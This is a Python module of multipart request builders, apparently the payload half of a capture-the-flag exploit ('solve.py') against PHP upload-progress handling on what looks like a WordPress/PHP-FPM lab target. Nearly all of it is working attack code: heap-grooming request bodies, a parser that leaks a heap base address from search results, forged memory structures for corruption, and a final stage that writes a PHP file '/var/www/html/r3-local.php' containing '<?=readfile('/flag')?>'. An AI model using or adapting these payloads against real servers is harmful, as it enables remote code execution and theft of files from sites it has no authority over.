# Multipart builders used by solve.py. The exact producer and leak hashes are
# checked below because a one-byte change is enough to break the heap layout.

import hashlib
import re
import struct
from urllib.parse import unquote_to_bytes

PRESSURE_BOUNDARY = "WP_FPM_LOCAL_12694"
FORGED_BOUNDARY = b"STOCK85_D_LOCAL_2026"
BODY_LIMIT = 1_048_576

PRODUCER_SHA256 = "c83dd915943c9f6983ca1e0e83a4074354892982ff2afd6d1507f1f4931283f5"
DEPTH60_SHA256 = "58f1c8900100e1ccf0ed4dabc15344f39cfd4d40c78941a623fa2d858b0fa69c"
DEPTH57_SHA256 = "5c06765907443e078f992dcd31b24c66d94061aea713c8ace55ff0f2c855da88"
TAIL16_LEAK_SHA256 = "a2d61c04d21b37ad0eb4055320352ce0aefe80ac9b262b30f96ebd6d6c78119f"

BIG_LEN = 102_375
D_SOURCE_OFF = 0xA000
F_VALUE_OFF = 0x12000
DT_VALUE_OFF = 0x13000
BIG_REAL_VALUE_FROM_B = 0x21A018
DEFAULT_P_FROM_B = 0x8862000
DEFAULT_Q_FROM_B = 0x608F00
TAIL_UPLOADS = 220
R2B_PROGRESS_KEY = b"K2stage0001"
R3_PROGRESS_KEY = b"K3stage0001"


def sha256(data):
    return hashlib.sha256(data).hexdigest()


def _bounded(data, label):
    if len(data) > BODY_LIMIT:
        raise ValueError(f"{label} exceeds the 1 MiB lab body limit")
    return data


def make_pressure_body(
    count,
    depth,
    field_count,
    field_len,
    *,
    progress,
    session_id,
    progress_key="local_probe",
    progress_file_size=1,
):
    # This is also used for the initial worker-pressure request.
    out = bytearray()

    def part(name, value, filename=None):
        out.extend(b"--" + PRESSURE_BOUNDARY.encode() + b"\r\n")
        out.extend(b'Content-Disposition: form-data; name="' + name.encode() + b'"')
        if filename is not None:
            out.extend(b'; filename="' + filename + b'"\r\n')
            out.extend(b"Content-Type: application/octet-stream")
        out.extend(b"\r\n\r\n" + value + b"\r\n")

    if progress:
        part("PHPSESSID", session_id.encode())
        part("PHP_SESSION_UPLOAD_PROGRESS", progress_key.encode())
        part("f", b"Z" * progress_file_size, b"f.bin")

    for index in range(field_count):
        part(f"P{index:04d}", b"R" * field_len)

    for index in range(count):
        part(f"x{index}" + "[a]" * depth, b"", b"")

    out.extend(b"--" + PRESSURE_BOUNDARY.encode() + b"--\r\n")
    return _bounded(bytes(out), "pressure body"), PRESSURE_BOUNDARY


def build_producer():
    payload, boundary = make_pressure_body(
        884,
        60,
        20,
        256,
        progress=False,
        session_id="",
    )
    if len(payload) != 275_210 or sha256(payload) != PRODUCER_SHA256:
        raise RuntimeError("producer body no longer matches the calibrated request")
    return payload, boundary


def consumer_body(upload_count, filler=0, filler_after=0):
    out = bytearray()

    def part(name, value, filename=None):
        out.extend(b"--" + FORGED_BOUNDARY + b"\r\n")
        out.extend(b'Content-Disposition: form-data; name="' + name.encode() + b'"')
        if filename is not None:
            out.extend(b'; filename="' + filename + b'"\r\n')
            out.extend(b"Content-Type: application/octet-stream")
        out.extend(b"\r\n\r\n" + value + b"\r\n")

    for index in range(upload_count):
        if filler and index == filler_after:
            part("BIG", b"Z" * filler)
        part(f"x{index}" + "[a]" * 60, b"", b"")
    if filler and filler_after == upload_count:
        part("BIG", b"Z" * filler)
    part("PHP_SESSION_UPLOAD_PROGRESS", b"stockdwatch")
    part("f", b"z", b"f.bin")
    out.extend(b"--" + FORGED_BOUNDARY + b"--\r\n")
    return _bounded(bytes(out), "consumer body")


def build_xpad_depth60():
    payload = consumer_body(462)
    old_x461 = (
        b"--" + FORGED_BOUNDARY + b"\r\n"
        + b'Content-Disposition: form-data; name="x461' + b"[a]" * 60
        + b'"; filename=""\r\n'
        + b"Content-Type: application/octet-stream\r\n\r\n\r\n"
    )
    new_x461 = old_x461.replace(
        b"Content-Type: application/octet-stream\r\n\r\n",
        b"Content-Type: application/octet-stream\r\n"
        + b"X-Pad: " + b"P" * 75_000 + b"\r\n\r\n",
        1,
    )
    if payload.count(old_x461) != 1:
        raise RuntimeError("x461 source part is not unique")
    payload = payload.replace(old_x461, new_x461, 1)

    progress = (
        b"--" + FORGED_BOUNDARY + b"\r\n"
        + b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        + b"stockdwatch\r\n"
    )
    search = (
        b"--" + FORGED_BOUNDARY + b"\r\n"
        + b'Content-Disposition: form-data; name="s"\r\n\r\n'
        + b"Z" * 291 + b"\r\n"
    )
    if payload.count(progress) != 1:
        raise RuntimeError("progress marker is not unique")
    payload = payload.replace(progress, progress + search + search, 1)

    old_final = (
        b"--" + FORGED_BOUNDARY + b"\r\n"
        + b'Content-Disposition: form-data; name="f"; filename="f.bin"\r\n'
        + b"Content-Type: application/octet-stream\r\n\r\nz\r\n"
    )
    new_final = (
        b"--" + FORGED_BOUNDARY + b"\r\n"
        + b"Content-Disposition: form-data; name=" + b" " * 32 + b'"'
        + b"N" * 291 + b'"; filename=' + b" " * 32 + b'"'
        + b"F" * 291 + b'"\r\n'
        + b"Content-Type: application/octet-stream\r\n\r\n\r\n"
    )
    if payload.count(old_final) != 1:
        raise RuntimeError("final file part is not unique")
    payload = payload.replace(old_final, new_final, 1)
    payload = _bounded(payload, "depth60 leak body")
    if sha256(payload) != DEPTH60_SHA256:
        raise RuntimeError("depth60 leak body no longer matches calibration")
    return payload


def build_xpad_depth57():
    payload = build_xpad_depth60()
    old = b'name="x461' + b"[a]" * 60 + b'"; filename=""'
    new = b'name="x461' + b"[a]" * 57 + b'"; filename=""'
    if payload.count(old) != 1:
        raise RuntimeError("depth60 x461 field is not unique")
    payload = payload.replace(old, new, 1)
    if len(payload) != 217_885 or sha256(payload) != DEPTH57_SHA256:
        raise RuntimeError("depth57 leak body no longer matches calibration")
    return payload


def build_tail16_leak():
    payload = build_xpad_depth57()
    prefix = (
        b"--" + FORGED_BOUNDARY + b"\r\n"
        + b'Content-Disposition: form-data; name="s"\r\n\r\n'
    )
    original = prefix + b"Z" * 291 + b"\r\n"
    tail16 = b"Z" * 224 + (-16).to_bytes(8, "little", signed=True) + b"\0" * 8 + b"Z" * 51
    replacement = prefix + tail16 + b"\r\n"
    if payload.count(original) != 2:
        raise RuntimeError("expected two original search fields")
    first = payload.index(original)
    second = payload.index(original, first + len(original))
    payload = payload[:second] + replacement + payload[second + len(original):]
    if len(payload) != 217_885 or sha256(payload) != TAIL16_LEAK_SHA256:
        raise RuntimeError("tail16 leak body no longer matches calibration")
    return payload


def parse_heap_base(raw):
    queries = [
        unquote_to_bytes(match.group(1).replace(b"+", b" "))
        for match in re.finditer(rb'\?s=([^"\'&<> ]+)', raw)
    ]
    matches = [
        value
        for value in queries
        if len(value) == 291
        and value[:56] == b"Z" * 56
        and value[168:224] == b"Z" * 56
        and value[224:232] == (-16).to_bytes(8, "little", signed=True)
        and value[232:240] == b"\0" * 8
        and value[240:] == b"Z" * 51
    ]
    if len(matches) != 1:
        raise RuntimeError(f"expected one structurally valid leak, found {len(matches)}")
    words = struct.unpack("<14Q", matches[0][56:168])
    bases = {word & ~0x1FFFFF for word in words}
    if len(bases) != 1 or not all(
        word % 16 == 0 and 0 < word < (1 << 47) for word in words
    ):
        raise RuntimeError("leaked pointer words failed alignment/canonicality checks")
    return next(iter(bases))


def _progress_marker(key=b"stockdwatch"):
    return (
        b"--" + FORGED_BOUNDARY + b"\r\n"
        + b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        + key + b"\r\n"
    )


def build_r2a(base, p_from_b=DEFAULT_P_FROM_B):
    payload = consumer_body(448)
    marker = _progress_marker()
    value = bytearray(b"R" * BIG_LEN)
    fake_entries = base + BIG_REAL_VALUE_FROM_B + F_VALUE_OFF
    target = base + p_from_b + 0x50
    used_slots = (target - (fake_entries + 16)) // 8
    if fake_entries + 16 + used_slots * 8 != target:
        raise RuntimeError("R2a target is not qword aligned")
    struct.pack_into("<9Q", value, D_SOURCE_OFF, fake_entries, 0, 0, 0, 0, 0, 4096, 0, 0)
    struct.pack_into("<qQ", value, F_VALUE_OFF, used_slots, 0)
    big = (
        b"--" + FORGED_BOUNDARY + b"\r\n"
        + b'Content-Disposition: form-data; name="BIG"\r\n\r\n'
        + bytes(value) + b"\r\n"
    )
    if payload.count(marker) != 1:
        raise RuntimeError("R2a progress marker moved")
    return _bounded(payload.replace(marker, big + marker, 1), "R2a body")


def _tail_parts(first_index):
    tail = bytearray()
    for index in range(first_index, first_index + TAIL_UPLOADS):
        name = f"t{index}".encode() + b"[a]" * 60
        tail.extend(
            b"--" + FORGED_BOUNDARY + b"\r\n"
            + b'Content-Disposition: form-data; name="' + name + b'"; filename=""\r\n'
            + b"Content-Type: application/octet-stream\r\n\r\n\r\n"
        )
    return bytes(tail)


def build_r2b(base, p_from_b=DEFAULT_P_FROM_B):
    payload = consumer_body(448)
    marker = _progress_marker()
    value = bytearray(b"S" * BIG_LEN)
    fake_entries = base + BIG_REAL_VALUE_FROM_B + F_VALUE_OFF
    fake_dtors = base + BIG_REAL_VALUE_FROM_B + DT_VALUE_OFF
    target = base + p_from_b + 0x48
    used_slots = (target - (fake_entries + 16)) // 8
    if fake_entries + 16 + used_slots * 8 != target:
        raise RuntimeError("R2b target is not qword aligned")
    struct.pack_into("<9Q", value, D_SOURCE_OFF, fake_entries, 0, fake_dtors, 0, 0, 0, 4096, 0, 0)
    struct.pack_into("<qQ", value, F_VALUE_OFF, used_slots, 0)
    struct.pack_into("<qQ", value, DT_VALUE_OFF, 0, 0)
    struct.pack_into("<QQQ", value, DT_VALUE_OFF + 32, 0, 0, 8)
    big = (
        b"--" + FORGED_BOUNDARY + b"\r\n"
        + b'Content-Disposition: form-data; name="BIG"\r\n\r\n'
        + bytes(value) + b"\r\n"
    )
    marker2 = _progress_marker(R2B_PROGRESS_KEY)
    if payload.count(marker) != 1:
        raise RuntimeError("R2b progress marker moved")
    payload = payload.replace(marker, big + marker2, 1)
    closing = b"--" + FORGED_BOUNDARY + b"--\r\n"
    if not payload.endswith(closing):
        raise RuntimeError("R2b closing boundary moved")
    return _bounded(payload[:-len(closing)] + _tail_parts(448) + closing, "R2b body")


def build_r3(
    base,
    q_from_b=DEFAULT_Q_FROM_B,
    *,
    path,
    filename,
):
    if not path.endswith(b"\0") or DT_VALUE_OFF + 56 + len(path) > BIG_LEN:
        raise ValueError("R3 path must be bounded and NUL terminated")
    if not filename or any(char in filename for char in (b'"', b"\r", b"\n")):
        raise ValueError("R3 filename is unsafe for Content-Disposition")

    payload = consumer_body(448)
    marker = _progress_marker()
    value = bytearray(b"S" * BIG_LEN)
    fake_entries = base + BIG_REAL_VALUE_FROM_B + F_VALUE_OFF
    fake_dtors = base + BIG_REAL_VALUE_FROM_B + DT_VALUE_OFF
    target = base + q_from_b
    used_slots = (target - (fake_entries + 16)) // 8
    if fake_entries + 16 + used_slots * 8 != target:
        raise RuntimeError("R3 target is not qword aligned")
    struct.pack_into("<9Q", value, D_SOURCE_OFF, fake_entries, 0, fake_dtors, 0, 0, 0, 4096, 0, 0)
    struct.pack_into("<qQ", value, F_VALUE_OFF, used_slots, 0)
    struct.pack_into("<qQ", value, DT_VALUE_OFF, 0, 0)
    struct.pack_into("<Q", value, DT_VALUE_OFF + 48, len(path))
    value[DT_VALUE_OFF + 56:DT_VALUE_OFF + 56 + len(path)] = path
    big = (
        b"--" + FORGED_BOUNDARY + b"\r\n"
        + b'Content-Disposition: form-data; name="BIG"\r\n\r\n'
        + bytes(value) + b"\r\n"
    )
    marker3 = _progress_marker(R3_PROGRESS_KEY)
    if payload.count(marker) != 1:
        raise RuntimeError("R3 progress marker moved")
    payload = payload.replace(marker, big + marker3, 1)
    tracked = b'filename="f.bin"'
    if payload.count(tracked) != 1:
        raise RuntimeError("R3 tracked filename moved")
    payload = payload.replace(tracked, b'filename="' + filename + b'"', 1)
    closing = b"--" + FORGED_BOUNDARY + b"--\r\n"
    if not payload.endswith(closing):
        raise RuntimeError("R3 closing boundary moved")
    return _bounded(payload[:-len(closing)] + _tail_parts(448) + closing, "R3 body")


def payload_plan():
    producer, _ = build_producer()
    leak = build_tail16_leak()
    placeholder = 0x7405DE800000
    php_name = b"<?=readfile('/flag')?>"
    return {
        "producer": {"bytes": len(producer), "sha256": sha256(producer)},
        "tail16_leak": {"bytes": len(leak), "sha256": sha256(leak)},
        "r2a_bytes": len(build_r2a(placeholder)),
        "r2b_bytes": len(build_r2b(placeholder)),
        "r3_bytes": len(
            build_r3(
                placeholder,
                DEFAULT_Q_FROM_B,
                path=b"/var/www/html/r3-local.php\0",
                filename=php_name,
            )
        ),
    }
